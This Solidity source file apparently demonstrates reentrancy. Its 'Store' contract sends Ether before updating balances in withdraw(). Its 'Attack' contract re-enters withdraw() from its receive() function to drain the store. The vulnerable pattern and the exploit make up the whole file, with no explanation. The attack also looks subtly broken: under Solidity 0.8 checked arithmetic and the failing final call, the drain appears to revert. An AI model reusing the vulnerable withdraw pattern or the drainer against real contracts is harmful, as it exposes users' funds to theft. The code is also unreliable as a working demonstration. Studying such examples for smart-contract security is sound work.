// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Store {
    mapping(address => uint) public user_balances;

    function deposit() public payable {
        user_balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(user_balances[msg.sender] >= _amount, "invalid amount for user");
        (bool status, ) = msg.sender.call{value: _amount}("");
        require(status, "Withdrawal Failed");
        user_balances[msg.sender] -= _amount;
    }

    function getBankBalance() public view returns(uint) {
        return address(this).balance;
    }
    //  uint result = 10;
    // function check () public pure returns(uint){
    //     return result = 5;
    // }

}



contract Attack {
    Store store;
    // address owner;

    fallback() external payable {

    }
    receive() external payable {
        store.withdraw(1 ether);
    }

    constructor(address _storeAddress){
        store = Store(_storeAddress);
        // owner = msg.sender;
    }

    function getAttackBalance() public view returns(uint){
        return address(this).balance;
    }


    function attack() public {
        store.deposit{value: 1 ether}();
        store.withdraw(1 ether);
    }

}